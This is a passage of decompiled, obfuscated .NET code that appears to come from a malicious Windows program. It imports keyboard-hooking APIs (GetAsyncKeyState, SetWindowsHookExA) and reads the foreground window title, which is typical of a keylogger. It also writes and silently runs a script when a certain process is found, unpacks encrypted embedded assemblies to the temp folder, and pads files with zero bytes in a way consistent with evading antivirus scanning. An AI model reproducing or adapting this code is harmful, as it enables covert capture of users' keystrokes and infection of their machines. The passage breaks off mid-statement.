        IntPtr num2 = (IntPtr) voidPtr1 + 24;
        *(int*) ((IntPtr) voidPtr1 + 28) = \u0088\u0002.\u007E\u0093\u0003((object) strArray, 0);
        *(int*) num2 = 0;
        while (true)
        {
          int num3 = *(int*) ((IntPtr) voidPtr1 + 24);
          *(int*) ((IntPtr) voidPtr1 + 32) = *(int*) ((IntPtr) voidPtr1 + 28);
          int num4 = *(int*) ((IntPtr) voidPtr1 + 32);
          if (num3 <= num4)
          {
            *(sbyte*) ((IntPtr) voidPtr1 + 36) = (sbyte) 1;
            if (*(sbyte*) ((IntPtr) voidPtr1 + 36) != (sbyte) 0)
            {
              *(sbyte*) ((IntPtr) voidPtr1 + 37) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr1 + 37) != (sbyte) 0)
              {
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3070)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3070)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3091)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3112)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3137)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3158)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3179)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3208)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3229)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3254)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3279)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3296)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3321)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3350)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3375)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3404)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3421)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3446)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3467)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3492)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3521)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3546)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3571)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3600)));
                \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3600)));
              }
              void* voidPtr2 = voidPtr1;
              *(long*) ((IntPtr) voidPtr1 + 8) = (long) \u0088\u0002.\u007E\u0093\u0003((object) strArray, 0);
              *(long*) voidPtr2 = 0L;
              while (true)
              {
                long num5 = *(long*) voidPtr1;
                *(long*) ((IntPtr) voidPtr1 + 16) = *(long*) ((IntPtr) voidPtr1 + 8);
                long num6 = *(long*) ((IntPtr) voidPtr1 + 16);
                if (num5 <= num6)
                {
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3070)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3070)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3091)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3112)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3137)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3158)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3179)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3208)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3229)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3254)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str3, \u000F.\u009B(3279)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3296)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3321)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3350)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3375)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3404)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3421)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3446)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3467)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3492)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3521)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3546)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3571)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3600)));
                  \u0013\u0002.\u0019\u0003(\u0003.\u0001, \u001F.\u001A\u0002(str2, \u000F.\u009B(3600)));
                  *(long*) voidPtr1 = checked (*(long*) voidPtr1 + 1L);
                }
                else
                  break;
              }
            }
            *(int*) ((IntPtr) voidPtr1 + 24) = checked (*(int*) unchecked ((IntPtr) voidPtr1 + 24) + 1);
          }
          else
            break;
        }
        return;
label_13:
        str3 = str1;
        goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
        return;
      }
label_15:
      voidPtr1 = (void*) num1;
      goto label_1;
    }

    static short \u0001([In] int obj0) => (short) ((int) \u0005.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0005.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0005.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0005.\u0006.\u0001[obj0 >> 12]);

    static unsafe int \u0001([In] int obj0, [In] \u0005.\u0001 obj1, [In] int obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        num1 = obj1.\u0001;
        num2 = 11;
        if (num2 != 0)
        {
          if (num1 != num2)
            goto label_8;
label_3:
          if (!\u000F.\u0001(obj1))
          {
            int num3 = obj1.\u0001.\u0002;
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = \u000F.\u0001(obj0, obj3, obj2, obj1.\u0001);
          obj0 += *(int*) ((IntPtr) voidPtr + 4);
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          obj2 -= *(int*) ((IntPtr) voidPtr + 4);
          if (obj2 != 0)
            goto label_3;
          else
            goto label_2;
        }
label_5:;
      }
      while (num1 > num2 && obj1.\u0001 != 11);
      goto label_6;
label_2:
      return *(int*) voidPtr;
label_6:
      return *(int*) voidPtr;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      Process[] processArray1 = \u0089\u0002.\u0094\u0003();
      Process[] processArray2;
      if (true)
        processArray2 = processArray1;
      *(int*) voidPtr = 0;
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) (*(int*) voidPtr < processArray2.Length);
        if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
        {
          Process process1 = processArray2[*(int*) voidPtr];
          *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) \u0092.\u007E\u0097\u0002((object) \u000F.\u007E\u007F((object) \u000F.\u007E\u001F((object) process1)), \u000F.\u009B(3629));
          if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
          {
            StreamWriter streamWriter = new StreamWriter(\u000F.\u009B(3638));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(3655));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(3684));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(3761));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(3790), \u0003.\u0001, \u000F.\u009B(3811)));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(3816));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(3857));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(3910));
            \u0010.\u007E\u008D((object) streamWriter);
            Process process2 = new Process();
            \u0013.\u007E\u0002\u0002((object) \u0080\u0002.\u007E\u008A\u0003((object) process2), \u000F.\u009B(3638));
            \u0015\u0002.\u007E\u001C\u0003((object) \u0080\u0002.\u007E\u008A\u0003((object) process2), ProcessWindowStyle.Hidden);
            int num = global::\u0002.\u007E\u0007((object) process2) ? 1 : 0;
          }
          *(int*) voidPtr = checked (*(int*) voidPtr + 1);
        }
        else
          break;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    static unsafe bool \u0001([In] \u0005.\u0005 obj0, [In] \u0005.\u0002 obj1)
    {
      int num1 = 8;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        goto label_43;
      }
label_2:
      int num2;
      int num3;
      int num4;
      int num5;
      switch (num1)
      {
        case 0:
          obj0.\u0002 = \u000F.\u0001(obj1, 5);
          if (obj0.\u0002 < 0)
            return false;
          obj0.\u0002 += 257;
          \u000F.\u0001(obj1, 5);
          obj0.\u0001 = 1;
          goto case 1;
        case 1:
          obj0.\u0003 = \u000F.\u0001(obj1, 5);
          if (obj0.\u0003 >= 0)
          {
            ++obj0.\u0003;
            \u000F.\u0001(obj1, 5);
            obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
            obj0.\u0002 = new byte[obj0.\u0005];
            obj0.\u0001 = 2;
            goto case 2;
          }
          else
            break;
        case 2:
          obj0.\u0004 = \u000F.\u0001(obj1, 4);
          if (obj0.\u0004 < 0)
            return false;
          obj0.\u0004 += 4;
          \u000F.\u0001(obj1, 4);
          obj0.\u0001 = new byte[19];
          obj0.\u0007 = 0;
          goto label_12;
        case 3:
label_19:
          num4 = obj0.\u0007;
          num5 = obj0.\u0004;
          if (true)
          {
            if (num4 < num5)
            {
              *(int*) voidPtr = \u000F.\u0001(obj1, 3);
              goto label_14;
            }
            else
            {
              obj0.\u0001 = new \u0005.\u0004(obj0.\u0001);
              obj0.\u0001 = (byte[]) null;
              obj0.\u0007 = 0;
              if (true)
              {
                obj0.\u0001 = 4;
                goto case 4;
              }
              else
                break;
            }
          }
          else
            goto label_25;
        case 4:
label_27:
          int num6;
          if (((num6 = \u000F.\u0001(obj0.\u0001, obj1)) & -16) == 0)
          {
            if (true)
            {
              byte[] numArray = obj0.\u0002;
              num2 = obj0.\u0007++;
              int index = num2;
              int num7 = (int) (obj0.\u0001 = (byte) num6);
              numArray[index] = (byte) num7;
              int num8 = obj0.\u0007;
              num5 = obj0.\u0005;
              num4 = num8;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
          {
            if (num6 < 0)
              return false;
            if (num6 >= 17)
              obj0.\u0001 = (byte) 0;
            obj0.\u0006 = num6 - 16;
            if (true)
            {
              obj0.\u0001 = 5;
              goto case 5;
            }
            else
              goto case 5;
          }
        case 5:
          *(int*) ((IntPtr) voidPtr + 4) = \u0005.\u0005.\u0002[obj0.\u0006];
          num3 = \u000F.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
          if (num3 < 0)
            return false;
          goto label_36;
        default:
          goto label_43;
      }
      return false;
label_12:
      obj0.\u0001 = 3;
      goto label_19;
label_14:
      int num9 = *(int*) voidPtr;
      if (false)
        return num9 != 0;
      if (num9 < 0)
        return false;
      \u000F.\u0001(obj1, 3);
      if (true)
      {
        obj0.\u0001[\u0005.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
        ++obj0.\u0007;
        goto label_19;
      }
      else
        goto label_36;
label_25:
      if (num4 == num5)
        return true;
      goto label_27;
label_36:
      \u000F.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
      num3 += \u0005.\u0005.\u0001[obj0.\u0006];
      while (num3-- > 0)
      {
        byte[] numArray = obj0.\u0002;
        num2 = obj0.\u0007++;
        int index = num2;
        int num10 = (int) obj0.\u0001;
        numArray[index] = (byte) num10;
      }
      if (true)
      {
        if (obj0.\u0007 == obj0.\u0005)
          return true;
        obj0.\u0001 = 4;
      }
      else
        goto label_14;
label_43:
      int num11 = obj0.\u0001;
      if (true)
        num2 = num11;
      num1 = num2;
      goto label_2;
    }

    [DllImport("user32", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] long obj0);

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] int obj0, [In] \u0003.\u0001.\u0002 obj1, [In] int obj2, [In] int obj3);

    static int \u0001([In] \u0005.\u0007 obj0) => \u000F.\u0001(obj0) | \u000F.\u0001(obj0) << 16;

    static string \u0001([In] \u0003 obj0)
    {
      int c = 0;
      string str1;
      while (true)
      {
        str1 = new string((char) c, 100);
        int num = \u000F.\u0001(\u000F.\u0001(), ref str1, 100);
        if (false)
          c = num;
        else
          break;
      }
      str1 = \u008B\u0002.\u007E\u0096\u0003((object) str1, 0, checked (\u008A\u0002.\u0095\u0003(str1, \u000F.\u009B(3919), CompareMethod.Binary) - 1));
      string str2 = str1;
      if (false)
        ;
      return str2;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(3924));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0004);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0005);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    [DllImport("kernel32.dll", EntryPoint = "GetShortPathName", CharSet = CharSet.Auto)]
    static extern int \u0001([MarshalAs(UnmanagedType.LPTStr)] string _param0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder _param1, int _param2);

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(3961));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0005);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0004);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] int obj0, [In] int obj1, [In] int obj2, [In] \u0003.\u0001.\u0001 obj3);

    static unsafe Assembly \u0001(object _param0, ResolveEventArgs _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      \u0007.\u0001.\u0001 obj = new \u0007.\u0001.\u0001(_param1.Name);
      string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001(false)));
      string[] strArray = "e2VlMTA0ODk5LTdmN2UtNGIxZC05YzkzLTk2YjMzY2UwYTU5YX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{f261218f-3cad-40a6-a5f4-badeb3b86396},e2VlMTA0ODk5LTdmN2UtNGIxZC05YzkzLTk2YjMzY2UwYTU5YX0=,[z]{f261218f-3cad-40a6-a5f4-badeb3b86396}".Split(',');
      string str1 = string.Empty;
      *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < strArray.Length - 1)
      {
        if (strArray[*(int*) voidPtr] == base64String1)
        {
          str1 = strArray[*(int*) voidPtr + 1];
          break;
        }
        *(int*) voidPtr = *(int*) voidPtr + 2;
      }
      if (str1.Length == 0 && obj.\u0003.Length == 0)
      {
        string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < strArray.Length - 1)
        {
          if (strArray[*(int*) ((IntPtr) voidPtr + 4)] == base64String2)
          {
            str1 = strArray[*(int*) ((IntPtr) voidPtr + 4) + 1];
            break;
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 2;
        }
      }
      if (str1.Length > 0)
      {
        if (str1[0] == '[')
        {
          *(int*) ((IntPtr) voidPtr + 8) = str1.IndexOf(']');
          string str2 = str1.Substring(1, *(int*) ((IntPtr) voidPtr + 8) - 1);
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (str2.IndexOf('z') >= 0);
          *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (str2.IndexOf('t') >= 0);
          str1 = str1.Substring(*(int*) ((IntPtr) voidPtr + 8) + 1);
        }
        lock (\u0007.\u0001.\u0001)
        {
          if (\u0007.\u0001.\u0001.ContainsKey((object) str1))
            return (Assembly) \u0007.\u0001.\u0001[(object) str1];
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
          if (manifestResourceStream != null)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) manifestResourceStream.Length;
            byte[] numArray = new byte[*(int*) ((IntPtr) voidPtr + 12)];
            manifestResourceStream.Read(numArray, 0, *(int*) ((IntPtr) voidPtr + 12));
            if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
              numArray = \u000F.\u0001(numArray);
            Assembly assembly = (Assembly) null;
            if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
              catch (BadImageFormatException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
            }
            if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
            {
              try
              {
                string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                Directory.CreateDirectory(path1);
                string path2 = path1 + obj.\u0001 + ".dll";
                if (!System.IO.File.Exists(path2))
                {
                  FileStream fileStream = System.IO.File.OpenWrite(path2);
                  fileStream.Write(numArray, 0, numArray.Length);
                  fileStream.Close();
                  \u000F.\u0001(path2, (string) null, 4);
                  \u000F.\u0001(path1, (string) null, 4);
                }
                assembly = Assembly.LoadFile(path2);
              }
              catch
              {
              }
            }
            \u0007.\u0001.\u0001[(object) str1] = (object) assembly;
            return assembly;
          }
        }
      }
      return (Assembly) null;
    }

    static unsafe void \u0001([In] string obj0)
    {
label_0:
      int num = 5;
      void* voidPtr;
      if (num != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num);
        goto label_10;
      }
      else
        goto label_8;
label_2:
      string[] strArray;
      if (true)
      {
        if (true)
        {
          strArray = \u008C\u0002.\u0097\u0003();
          *(int*) voidPtr = 0;
        }
      }
      else
        goto label_0;
label_6:
      if (true)
      {
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) (*(int*) voidPtr < strArray.Length);
        num = (int) *(sbyte*) ((IntPtr) voidPtr + 4);
      }
      else
        goto label_2;
label_8:
      if (num != 0)
      {
        if (true)
        {
          \u000F.\u0001(strArray[*(int*) voidPtr]);
          *(int*) voidPtr = checked (*(int*) voidPtr + 1);
          goto label_6;
        }
      }
      else
      {
        FileStream fileStream = \u008D\u0002.\u0099\u0003(\u001F.\u001A\u0002(\u009D.\u0003\u0003(Environment.SpecialFolder.ApplicationData), \u000F.\u009B(1619)));
        return;
      }
label_10:
      \u0003.\u0001.\u0002 = obj0;
      goto label_2;
    }

    static \u0005.\u0004 \u0001([In] \u0005.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0002];
      Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
      return new \u0005.\u0004(destinationArray);
    }

    static int \u0001([In] \u0005.\u0002 obj0)
    {
      int num1 = obj0.\u0002;
      int num2;
      int num3;
      while (true)
      {
        num2 = obj0.\u0001;
        if (true)
        {
          num3 = num1 - num2;
          if (false)
            num1 = num3;
          else
            goto label_7;
        }
        else
          break;
      }
label_2:
      do
      {
        if (true)
          num2 >>= 3;
      }
      while (false);
      return num1 + num2;
label_7:
      num2 = obj0.\u0003;
      num1 = num3;
      goto label_2;
    }

    static unsafe void \u0001([In] string obj0, [In] string obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(14);
      *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u008E.\u0091\u0002(obj0);
      if (*(sbyte*) ((IntPtr) voidPtr + 12) == (sbyte) 0)
        return;
      *(sbyte*) ((IntPtr) voidPtr + 13) = (sbyte) !\u008E.\u0092\u0002(\u001F.\u001A\u0002(obj0, obj1));
      if (*(sbyte*) ((IntPtr) voidPtr + 13) != (sbyte) 0)
      {
        try
        {
          \u008E\u0002.\u009B\u0003(\u000F.\u007E\u001C((object) \u0012\u0002.\u007E\u0018\u0003((object) \u0011\u0002.\u0017\u0003())), \u001F.\u001A\u0002(obj0, obj1), true);
label_3:
          FileStream fileStream = \u008D\u0002.\u009A\u0003(\u001F.\u001A\u0002(obj0, obj1));
          *(long*) voidPtr = \u008F\u0002.\u007E\u009C\u0003((object) fileStream, 0L, SeekOrigin.End);
          *(int*) ((IntPtr) voidPtr + 8) = \u0090\u0002.\u009D\u0003(\u000E.\u007E\u0015((object) obj1));
          Decimal num = new Decimal(checked (*(int*) unchecked ((IntPtr) voidPtr + 8) * 10485));
          while (true)
          {
            *(sbyte*) ((IntPtr) voidPtr + 13) = (sbyte) (\u0092\u0002.\u009F\u0003(new Decimal(*(long*) voidPtr), num) < 0);
            if (*(sbyte*) ((IntPtr) voidPtr + 13) != (sbyte) 0)
            {
              *(long*) voidPtr = checked (*(long*) voidPtr + 1L);
              if (true)
                \u0091\u0002.\u007E\u009E\u0003((object) fileStream, (byte) 0);
              else
                goto label_3;
            }
            else
              break;
          }
          \u0010.\u007E\u008E((object) fileStream);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (false)
            ;
          \u0088.\u0089\u0002();
        }
      }
    }

    static void \u0001()
    {
      try
      {
        \u0008.\u0001();
      }
      catch (Exception ex)
      {
      }
    }

    static void \u0001([In] \u0005.\u0003 obj0, [In] int obj1)
    {
label_0:
      do
      {
        \u0005.\u0003 obj2 = obj0;
        int num1;
        int num2 = num1 = obj2.\u0002;
        obj2.\u0002 = num1 + 1;
        do
        {
          if (true)
          {
            if (num2 != 32768)
              goto label_3;
label_2:
            goto label_0;
label_3:
            if (true)
            {
              byte[] numArray = obj0.\u0001;
              \u0005.\u0003 obj3 = obj0;
              int num3;
              num2 = num3 = obj3.\u0001;
              obj3.\u0001 = num3 + 1;
              int index = num2;
              int num4 = (int) (byte) obj1;
              numArray[index] = (byte) num4;
              if (false)
